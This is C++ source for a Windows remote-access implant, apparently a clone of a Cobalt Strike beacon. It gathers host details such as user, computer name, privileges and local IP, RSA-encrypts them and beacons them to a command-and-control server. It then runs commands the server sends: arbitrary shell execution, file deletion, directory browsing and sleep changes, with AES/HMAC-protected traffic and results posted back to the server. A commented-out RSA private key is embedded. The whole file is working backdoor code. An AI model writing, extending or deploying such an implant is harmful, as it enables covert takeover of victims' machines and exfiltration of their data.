#include "WhatBoys.h"
#include "config.h"
#include "Utils.hpp"
#include "SHA256.h"
#include "AES.h"
#include "RSAHelper.h"
#include "Base64.hpp"
#include "hmac_sha256.h"
#include "WinHttpClient.h"
#include "FileBrower.hpp"
#include "DebugPrint.h"



bool	Beacon::WhatBoys::connect()
{

	//CryptoPP::Integer n("0xa738cde75f1fbb1c18646c377e03016b162b12ba72bdf7dc36b4cd2e4e9bae12205a95c26170bf908105ad7fa4bbccfa798632261bed9870f975f20794e1fe499523d71f08a56cae0315bfde3d6c8a16386b03b7a6551aa1336d50325a3500db27d78ad8fd13b6a73b9fb7c3fb4d7a088e323f07618656ecd83595fa5f823613");
	//CryptoPP::Integer e("0x10001");

	auto b64_cookie = s2ws(base64::to_base64(s_meta_cipher_));
	bool	is_init = true;
	while (true) {
		//header{ {"Cookie",b64_cookie},{"Accept","*"}};
		if (is_init==false) 
		{
			wlog("sleep_time: ", wait_time_);
			SleepEx(wait_time_, false);
		}
		is_init = false;
		wstring headers = L"Cookie: " + b64_cookie + L"\r\n";
		wlog(headers);
		WinHttpClient client(GetUrl);
		client.SetAdditionalRequestHeaders(headers);
		if (client.SendHttpRequest() == false) {
			wlog(L"reconnect server...");
			continue;
		}
		const BYTE* http_content = client.GetRawResponseContent();
		auto size = client.GetRawResponseContentLength();


		if (size == 0 || size < HmacHashLen)
		{
			continue;
		}

		std::uint32_t resp_size = size - HmacHashLen;
		auto response = new BYTE[resp_size];

		memcpy(response, http_content, size - HmacHashLen);//忽略后面的Hmachash;

		AES aes(AESKeyLength::AES_128);  //128 - key length, can be 128, 192 or 256
		auto c = aes.DecryptCBC(response, resp_size, Config::AesKey, AES_IV);
		//aes.printHexArray(c, resp_size);
		std::unique_ptr<unsigned char[]> ptr_mgr(c);
		int pack_len = read_uint32(c + 4);
		if (pack_len <= 0)
		{
			continue;
		}
		std::pair<int, std::string> type_buf = parse_command(c + 8);
		//delete[] c;
		auto cmd_result = command_default_callback(type_buf.first, type_buf.second);//服务器命令回调接口
		if (cmd_result.second.empty())
		{
			continue;
		}

		std::string server_packet = make_result_packet(cmd_result.first, cmd_result.second);

		this->push_result(server_packet);
		
		
	}
	return true;
}

std::string	Beacon::WhatBoys::make_result_packet(int type, std::string& content)
{
	packet_counter_++;
	std::uint32_t p_cnt = htonl(packet_counter_);
	std::string encypt_packet;
	encypt_packet.append((char*)&p_cnt, 4);
	std::uint32_t content_size = htonl(content.size() + 4);
	encypt_packet.append((char*)&content_size, 4);
	std::uint32_t p_type = htonl(type);
	encypt_packet.append((char*)&p_type, 4);

	encypt_packet.append(content);

	//std::vector<unsigned char>	enc_buf(encypt_packet.begin(), encypt_packet.end());
	unsigned int c_size = 0;
	AES aes(AESKeyLength::AES_128);  //128 - key length, can be 128, 192 or 256
	auto c = aes.EncryptCBC((unsigned char*)encypt_packet.c_str(), encypt_packet.size(), Config::AesKey, AES_IV, c_size);
	std::unique_ptr<unsigned char[]> ptr_mgr(c);

	std::string final_packet;
	std::uint32_t final_size = htonl(c_size + HmacHashLen);
	final_packet.append((char*)&final_size, 4);
	final_packet.append((char*)c, c_size);
	std::vector<uint8_t> out(32);
	// Call hmac-sha256 function
	hmac_sha256(
		Config::HmacKey, 16,
		c, c_size,
		out.data(), out.size()
	);
	final_packet.append(out.begin(), out.begin() + 16);
	//delete[] c;
	return final_packet;
}

std::string		Beacon::WhatBoys::b_exec(std::string& cmd)
{
	char buffer[128];
	std::string result = "";
	FILE* pipe = _popen(cmd.c_str(), "r");
	if (!pipe) throw std::runtime_error("C runtime popen() failed!");
	try {
		while (fgets(buffer, sizeof buffer, pipe) != NULL) {
			result += buffer;
		}
	}
	catch (...) {
		_pclose(pipe);
		throw;
	}
	_pclose(pipe);
	return result;
}

std::pair<int, std::string>	Beacon::WhatBoys::parse_command(unsigned char* buf)
{
	int	cmd_type = 0, cmd_len = 0;
	std::string cmd_buf;
	//endian_swap(buf, 0, 4);
	cmd_type = read_uint32(buf);
	//endian_swap(buf, 4, 4);
	cmd_len = read_uint32(buf + 4);
	cmd_buf.append((char*)(buf + 8), cmd_len);
	return make_pair(cmd_type, cmd_buf);
}

Beacon::WhatBoys::WhatBoys()
{
	s_meta_info_ = make_meta_info();
	std::string			RsaPublicKey = PUBKEY;

	s_meta_cipher_ = RsaPubEncrypt(s_meta_info_, RsaPublicKey);

	wait_time_ = WAITTIME;
	packet_counter_ = 0;
	/*
	std::string pri_key = R"(-----BEGIN PRIVATE KEY-----
MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAKc4zedfH7scGGRsN34DAWsWKxK6
cr333Da0zS5Om64SIFqVwmFwv5CBBa1/pLvM+nmGMiYb7Zhw+XXyB5Th/kmVI9cfCKVsrgMVv949
bIoWOGsDt6ZVGqEzbVAyWjUA2yfXitj9E7anO5+3w/tNegiOMj8HYYZW7Ng1lfpfgjYTAgMBAAEC
gYBZ63DFTuB4NBZlwc9hQmp71BLbYkkbH/JZtIV0ti5+vx6It2ksDn3kTYzpC+9gUUwLFv9WgMQV
qgJqyvgKti+PMGmMcTJTDd1GpEt3dzhwNzEuScWdxaAOIJZ0NfdMrGcDogHsNDG4YAjg2XP6d1eZ
vHuIYwNycKM4KcCB5suqEQJBAOJdR3jg0eHly2W+ODb11krwbQVOxuOwP3j2veie8tnkuTK3Nfwm
Slx6PSp8ZtABh8PcpRw+91j9/ecFZMHC6OkCQQC9HVV20OhWnXEdWspC/YCMH3CFxc7SFRgDYK2r
1sVTQU/fTM2bkdaZXDWIZjbLFOb0U7/zQfVsuuZyGMFwdwmbAkBiDxJ1FL8W4pr32i0z8c8A66Hu
mK+j1qfIWOrvqFt/dIudoqwqLNQtt25jxzwqg18yw5Rq5gP0cyLYPwfkv/BxAkAtLhnh5ezr7Hc+
pRcXRAr27vfp7aUIiaOQAwPavtermTnkxiuE1CWpw97CNHE4uUin7G46RnLExC4T6hgkrzurAkEA
vRVFgcXTmcg49Ha3VIKIb83xlNhBnWVkqNyLnAdOBENZUZ479oaPw7Sl+N0SD15TgT25+4P6PKH8
QE6hwC/g5Q==
-----END PRIVATE KEY-----)";*/

//std::string plain = RsaPriDecrypt(s_meta_cipher_, pri_key);
//if (plain == s_meta_info_) {
//	printf("rsa success");
//
//}
}


std::pair<int, std::string>	Beacon::WhatBoys::command_default_callback(int cmd_type, std::string& cmd_buf)
{
	//auto ret = make_pair(-1, "unkonwn");
	std::uint32_t	err_id = 0, arg1 = 0, arg2 = 0, type = 0,offset=0;
	std::uint32_t	pending_req = 0, path_len = 0;
	std::string		msg,file_path;
	std::vector<win_file>	files;
	char	buffer[MAX_PATH];
	char*	nouse = nullptr;
	std::stringstream	format_file;
	switch (cmd_type)
	{
	case	1:
		break;
	case	Beacon::CMD::TYPE_EXIT:
		exit(0);
		break;
	case	Beacon::CMD::TYPE_SLEEP:
		wait_time_ = read_uint32((unsigned char*)cmd_buf.c_str());
		type = 31;
		msg.append((char*)&err_id, 4);
		msg.append((char*)&arg1, 4);
		msg.append((char*)&arg2, 4);
		msg.append("OK");
		break;
	case	Beacon::CMD::TYPE_CD:
		SetCurrentDirectoryA(cmd_buf.c_str());
		type = 0;
		break;
	case	Beacon::CMD::TYPE_PWD:
		nouse = _getcwd(buffer, MAX_PATH);
		type = 32;
		msg.append(buffer);
		break;
	case	Beacon::CMD::TYPE_DEL_FILE:
		type = 0;
		msg = DeleteFileA(cmd_buf.c_str()) != 0 ? "OK" : "failed with "+to_string(GetLastError());
		break;
	case	Beacon::CMD::TYPE_SHELL:
		offset = read_uint32((unsigned char*)cmd_buf.c_str());
		offset += 4+4+4;
		type = 31;
		msg.append((char*)&err_id, 4);
		msg.append((char*)&arg1, 4);
		msg.append((char*)&arg2, 4);
		msg.append(b_exec(cmd_buf.substr(offset)));
		break;
	case	Beacon::CMD::TYPE_FILE_BROWSE:
		pending_req = read_uint32_little((unsigned char*)cmd_buf.c_str());
		path_len = read_uint32((unsigned char*)(cmd_buf.c_str()+4));
		file_path = cmd_buf.substr(8, path_len);
		//file_path = subreplace(file_path, "\\", "/");
		file_path = subreplace(file_path, "*", "");
		
		if (file_path == ".\\")
		{
			auto nouse = _getcwd(buffer, MAX_PATH);
			file_path = buffer;
		}

		format_file << file_path << "/*";
		wlog(file_path.c_str());

		if (file_path.back() != '\\')
		{
			file_path.append("\\*");
		}
		else
		{
			file_path.append("*");
		}
		files = list_file(file_path);
		for (auto& f : files)//\nD\t0\t%s\t.
		{
			format_file << "\n" << f.flag << "\t" << f.size << "\t" << f.time << "\t" << f.name;
		}
		type = 22;
		msg.append((char*)&pending_req, 4);
		msg.append(format_file.str());
		break;
	default:
		type = 31;
		msg.append((char*)&err_id, 4);
		msg.append((char*)&arg1, 4);
		msg.append((char*)&arg2, 4);
		msg.append("what");
		break;
	}
	auto ret = make_pair(type, msg);
	return ret;
}

bool	Beacon::WhatBoys::push_result(std::string &result)
{
	std::wstring post_url = PostUrl;//L"http://192.168.150.133/RCg/neak.htm?icar=" + b_id_;
	post_url.append(L"?").append(PostId).append(L"=").append(b_id_);
	WinHttpClient server(post_url);
	wstring server_headers = L"Content-Length: ";
	server_headers += to_wstring(result.size());
	server.SetAdditionalDataToSend((BYTE*)result.c_str(), result.size());
	server.SetAdditionalRequestHeaders(server_headers);
	if (server.SendHttpRequest(L"POST") == false)
	{
		wlog("Post failed\n");
		return false;
	}
	return true;
}

std::uint8_t	Beacon::WhatBoys::get_metadata_flag()
{
	std::uint8_t	meta_flag = 0;
	if (is_high_priv()) 
	{
		meta_flag |= 8;
	}
	if (is_os_x64()) 
	{
		meta_flag |= 4;
	}
	if (is_process_x64()) 
	{
		meta_flag |= 2;
	}
	return meta_flag;
}

std::uint32_t	Beacon::WhatBoys::get_magic_head()
{
	return 0xBEEF;
}

std::string	Beacon::WhatBoys::make_meta_info() {

	auto info = std::make_shared<system_info>();
	auto id = get_boy_id();
	b_id_ = to_wstring(id);
	(*info).client_id = htonl(id);
	(*info).process_id = htonl(get_process_id());
	(*info).ssh_port = htonl(0xbeef);
	(*info).meta_flag = get_metadata_flag();
	(*info).build_ver = htonl(0xbeef);
	(*info).func_addr = htonl(0x0);
	(*info).gmhb_addr = htonl(0x0);
	(*info).gpab_addr = htonl(0x0);
	(*info).loacl_ip = htonl(get_local_ip());

	get_rand_bytes(Config::GlobalKey, sizeof(Config::GlobalKey));
	Crypt::SHA256	sha;
	sha.update(Config::GlobalKey, sizeof(Config::GlobalKey));
	uint8_t* digest = sha.digest();
	memcpy(Config::AesKey, digest, 16); //前16为AES key
	memcpy(Config::HmacKey, digest + 16, 16); ////后16为AES key
	delete[] digest;

	std::string info_bytes;
	info_bytes.append((char*)&info->client_id, sizeof(std::uint32_t));
	info_bytes.append((char*)&info->process_id, sizeof(std::uint32_t));
	info_bytes.append((char*)&info->ssh_port, sizeof(std::uint16_t));
	info_bytes.append((char*)&info->meta_flag, sizeof(std::uint8_t));
	info_bytes.append((char*)&info->major_ver, sizeof(std::uint8_t));
	info_bytes.append((char*)&info->minor_ver, sizeof(std::uint8_t));
	info_bytes.append((char*)&info->build_ver, sizeof(std::uint16_t));
	info_bytes.append((char*)&info->func_addr, sizeof(std::uint32_t));
	info_bytes.append((char*)&info->gmhb_addr, sizeof(std::uint32_t));
	info_bytes.append((char*)&info->gpab_addr, sizeof(std::uint32_t));
	info_bytes.append((char*)&info->loacl_ip, sizeof(std::uint32_t));

	std::string u_name = get_user_name();
	std::string p_name = get_process_name();
	std::string c_name = get_computer_name();
	std::string os_info;
	os_info += c_name;
	os_info += '\t';
	os_info += u_name;
	os_info += '\t';
	os_info += p_name;
	info_bytes += os_info;

	std::uint16_t	localANSI = GetACP();
	std::uint16_t	localOEM = GetOEMCP();

	std::string	meta_info;
	meta_info.append((char*)Config::GlobalKey, sizeof(Config::GlobalKey));
	meta_info.append((char*)&localANSI, sizeof(std::uint16_t));
	meta_info.append((char*)&localOEM, sizeof(std::uint16_t));
	meta_info.append(info_bytes);

	std::string client_msg;
	std::uint32_t	magic_head = htonl(get_magic_head());
	std::uint32_t	msg_len = htonl(meta_info.size());
	client_msg.append((char*)&magic_head, sizeof(std::uint32_t));
	client_msg.append((char*)&msg_len, sizeof(std::uint32_t));
	client_msg.append(meta_info);

	return client_msg;
}

std::uint32_t	Beacon::WhatBoys::get_boy_id()
{
	std::default_random_engine e(__rdtsc());
	std::uniform_int_distribution<std::uint32_t> u(100000, 999998);
	auto id = u(e);
	if (id % 2 == 0)
	{
		return id;
	}
	else 
	{
		return id + 1;
	}
}